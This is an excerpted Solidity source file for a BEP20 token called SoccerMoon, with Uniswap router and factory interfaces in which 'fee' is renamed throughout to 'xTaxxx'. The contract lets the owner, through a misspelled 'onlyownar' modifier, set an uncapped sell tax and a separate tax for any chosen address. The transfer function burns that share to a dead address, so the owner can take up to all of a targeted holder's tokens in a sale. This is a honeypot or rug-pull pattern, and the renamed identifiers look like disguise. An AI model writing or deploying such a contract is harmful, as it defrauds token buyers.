...
interface IUniswapV2Factory {
    ...
    function xTaxxxTo() external view returns (address);
    function xTaxxxToSetter() external view returns (address);
    ...
    function setxTaxxxTo(address) external;
    function setxTaxxxToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingxTaxxxOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingxTaxxxOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingxTaxxxOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingxTaxxxOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingxTaxxxOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SoccerMoon is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellxTaxxx = 0;

    uint256 private _defaultBuyxTaxxx = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipxTaxxx;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellxTaxxx = _value;
    }

    function setSlipxTaxxx(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipxTaxxx[_address] = _value;
    }

    function getSlipxTaxxx(address _address) external view onlyownar returns (uint256) {
        return _slipxTaxxx[_address];
    }


    function setMAccountxTaxxx(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountxTaxxx(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradexTaxxxAmount = 0;

        if (rF) {
            uint256 tradexTaxxx = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradexTaxxx = _defaultSellxTaxxx;
                }
                if (from == uniswapV2Pair) {

                    tradexTaxxx = _defaultBuyxTaxxx;
                }
            }
            if (_slipxTaxxx[from] > 0) {
                tradexTaxxx = _slipxTaxxx[from];
            }

            tradexTaxxxAmount = _Amount.mul(tradexTaxxx).div(100);
        }


        if (tradexTaxxxAmount > 0) {
            _balances[from] = _balances[from].sub(tradexTaxxxAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradexTaxxxAmount);
            emit Transfer(from, _deadAddress, tradexTaxxxAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradexTaxxxAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradexTaxxxAmount);
        emit Transfer(from, _to, _Amount - tradexTaxxxAmount);
    }
